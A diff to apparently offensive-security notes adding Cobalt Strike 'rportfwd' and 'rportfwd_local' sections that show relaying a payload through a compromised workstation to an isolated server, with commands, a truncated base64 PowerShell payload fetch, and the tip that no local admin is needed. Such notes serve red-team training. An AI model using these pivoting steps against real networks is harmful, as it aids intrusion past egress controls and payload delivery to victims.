@@ -59,6 +59,9 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 
 ### CobaltStrike
 
+### rportfwd Command
+
+
 In many corporate environments, workstations are able to browse the Internet on ports 80 and 443, but servers have no direct outbound access (because why do they need it?).
 
 Let's imagine that we already have foothold access to a workstation and have a means of moving laterally to a server - we need to deliver a payload to it but it doesn't have Internet access to pull it from our Team Server. We can use the workstation foothold as a relay point between our webserver and the target.
@@ -72,6 +75,8 @@ dc-2
 PS C:\> iwr -Uri http://10.10.5.120/a
 iwr : Unable to connect to the remote server
 ```
+
+You don't need to be a local admin to create reverse port forwards on high ports.
 
 The syntax for the `rportfwd` command is `rportfwd [bind port] [forward host] [forward port]`. On the workstation (forward host and port should point to your payload on the team server):
 
@@ -91,7 +96,54 @@ Active Connections
   TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING
 ```
 
-Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On the server, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of WKSTN-1).
+Now any traffic hitting this port will be redirected to **10.10.5.120** on port **80**. On the server, instead of trying to hit **10.10.5.120:80**, we use **10.10.17.231:8080** (where 10.10.17.231 is the IP address of the workstation).
+```
+PS C:\> iwr -Uri http://10.10.17.231:8080/a
+
+StatusCode        : 200
+StatusDescription : OK
+Content           : $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAAAAAAAAAOy9Wa/qSrIu+rzrV8yHLa21xNo
+                    1wIAxR9rSNTYY444eTJ1SyRjjBtw3YM49//1GZBoGY865VtXW1rkPV3dKUwyMnU1kNF9EZoRXTvEfqyLz7UKLT863/9g6We7H0T
+                    fm...
+```
+
+To stop the reverse port forward, do `rportfwd stop 8080` from within the Beacon or click the **Stop** button in the **Proxy Pivots** view.
+
+
+### rportfwd_local
+
+Beacon also has a `rportfwd_local` command.  Whereas `rportfwd` will tunnel traffic to the Team Server, `rportfwd_local` will tunnel the traffic to the machine running the Cobalt Strike client.
+
+This is particularly useful in scenarios where you want traffic to hit tools running on your local system, rather than the Team Server.
+
+Take this Python http server as an example, whilst running the CS client on Kali:
+
+
+```
+root@kali:~# echo "This is a test" > test.txt
+root@kali:~# python3 -m http.server --bind 127.0.0.1 8080
+Serving HTTP on 127.0.0.1 port 8080 (http://127.0.0.1:8080/)
+```
+```
+beacon> rportfwd_local 8080 127.0.0.1 8080
+[+] started reverse port forward on 8080 to rasta -> 127.0.0.1:8080
+```
+
+This will bind port 8080 on the machine running the Beacon and will tunnel the traffic to port 8080 of the localhost running the Cobalt Strike client.
+
+Then on another machine in the network, try to download the file.
+
+```
+PS C:\> hostname
+wkstn-2
+
+PS C:\> iwr -Uri http://wkstn-1:8080/test.txt
+
+StatusCode : 200
+StatusDescription : OK
+Content : This is a test
+
+```
 
 
 
